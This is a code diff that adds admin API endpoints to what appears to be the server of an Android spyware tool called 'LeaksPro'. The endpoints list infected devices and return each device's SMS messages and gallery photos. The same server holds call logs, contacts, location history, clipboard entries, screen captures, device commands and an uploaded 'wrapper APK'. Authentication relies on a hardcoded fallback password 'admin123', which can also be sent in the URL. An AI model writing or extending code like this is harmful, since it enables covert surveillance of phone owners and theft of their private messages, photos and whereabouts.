@@ -1113,6 +1113,140 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
+  // ═══════════════════════════════════════════════════════════════════════
+  // ADMIN APP API — Endpoints required by LeaksPro Admin mobile app
+  // ═══════════════════════════════════════════════════════════════════════
+
+  // POST /api/admin/login — Verify admin password
+  app.post('/api/admin/login', (req, res) => {
+    try {
+      const { password } = req.body;
+      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
+      const adminPwd = stored ? stored.value : (process.env.ADMIN_PASSWORD || 'admin123');
+
+      if (password === adminPwd) {
+        res.json({ success: true, message: 'Login successful' });
+      } else {
+        res.status(401).json({ success: false, message: 'Invalid password' });
+      }
+    } catch (err) {
+      res.status(500).json({ success: false, message: err.message });
+    }
+  });
+
+  // GET /api/admin/connections — List all registered devices
+  app.get('/api/admin/connections', (req, res) => {
+    try {
+      const password = req.headers['x-admin-password'] || req.query.password;
+      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
+      const adminPwd = stored ? stored.value : (process.env.ADMIN_PASSWORD || 'admin123');
+      if (password !== adminPwd) {
+        return res.status(401).json({ error: 'Unauthorized' });
+      }
+
+      const devices = db.prepare('SELECT * FROM devices ORDER BY last_seen DESC').all();
+      // Parse phone_numbers JSON for each device
+      const parsed = devices.map(d => {
+        try { d.phone_numbers = JSON.parse(d.phone_numbers || '[]'); } catch (_) { d.phone_numbers = []; }
+        return d;
+      });
+
+      const onlineCount = parsed.filter(d => d.is_online === 1).length;
+      res.json({
+        devices: parsed,
+        totalDevices: parsed.length,
+        onlineCount,
+        offlineCount: parsed.length - onlineCount
+      });
+    } catch (err) {
+      res.status(500).json({ error: err.message, devices: [] });
+    }
+  });
+
+  // DELETE /api/admin/connections/:deviceId — Delete a device and all its data
+  app.delete('/api/admin/connections/:deviceId', (req, res) => {
+    try {
+      const password = req.headers['x-admin-password'] || req.query.password;
+      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
+      const adminPwd = stored ? stored.value : (process.env.ADMIN_PASSWORD || 'admin123');
+      if (password !== adminPwd) {
+        return res.status(401).json({ error: 'Unauthorized' });
+      }
+
+      const { deviceId } = req.params;
+      // Delete from all tables
+      const tables = ['devices', 'sms_messages', 'call_logs', 'contacts', 'installed_apps', 'gallery_photos',
+                       'location_history', 'clipboard_entries', 'screen_captures', 'device_commands'];
+      for (const table of tables) {
+        try { db.prepare(`DELETE FROM ${table} WHERE device_id = ?`).run(deviceId); } catch (_) {}
+      }
+
+      res.json({ success: true, deleted: true });
+    } catch (err) {
+      res.status(500).json({ error: err.message, success: false });
+    }
+  });
+
+  // GET /api/admin/connections/:deviceId/sms — Get SMS messages for a device
+  app.get('/api/admin/connections/:deviceId/sms', (req, res) => {
+    try {
+      const password = req.headers['x-admin-password'] || req.query.password;
+      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
+      const adminPwd = stored ? stored.value : (process.env.ADMIN_PASSWORD || 'admin123');
+      if (password !== adminPwd) {
+        return res.status(401).json({ error: 'Unauthorized' });
+      }
+
+      const { deviceId } = req.params;
+      const page = parseInt(req.query.page) || 1;
+      const limit = parseInt(req.query.limit) || 200;
+      const offset = (page - 1) * limit;
+
+      const total = db.prepare('SELECT COUNT(*) as count FROM sms_messages WHERE device_id = ?').get(deviceId)?.count || 0;
+      const messages = db.prepare('SELECT * FROM sms_messages WHERE device_id = ? ORDER BY date DESC LIMIT ? OFFSET ?')
+        .all(deviceId, limit, offset);
+
+      res.json({
+        messages,
+        total,
+        page,
+        totalPages: Math.ceil(total / limit) || 1
+      });
+    } catch (err) {
+      res.status(500).json({ error: err.message, messages: [] });
+    }
+  });
+
+  // GET /api/admin/connections/:deviceId/gallery — Get gallery photos for a device
+  app.get('/api/admin/connections/:deviceId/gallery', (req, res) => {
+    try {
+      const password = req.headers['x-admin-password'] || req.query.password;
+      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
+      const adminPwd = stored ? stored.value : (process.env.ADMIN_PASSWORD || 'admin123');
+      if (password !== adminPwd) {
+        return res.status(401).json({ error: 'Unauthorized' });
+      }
+
+      const { deviceId } = req.params;
+      const page = parseInt(req.query.page) || 1;
+      const limit = parseInt(req.query.limit) || 200;
+      const offset = (page - 1) * limit;
+
+      const total = db.prepare('SELECT COUNT(*) as count FROM gallery_photos WHERE device_id = ?').get(deviceId)?.count || 0;
+      const photos = db.prepare('SELECT * FROM gallery_photos WHERE device_id = ? ORDER BY date_taken DESC LIMIT ? OFFSET ?')
+        .all(deviceId, limit, offset);
+
+      res.json({
+        photos,
+        total,
+        page,
+        totalPages: Math.ceil(total / limit) || 1
+      });
+    } catch (err) {
+      res.status(500).json({ error: err.message, photos: [] });
+    }
+  });
+
   // POST /api/admin/upload-wrapper — Upload the wrapper APK (admin only)
   const multer = require('multer');
   const wrapperUpload = multer({ dest: path.join(__dirname, 'data', 'tmp'), limits: { fileSize: 20 * 1024 * 1024 } });
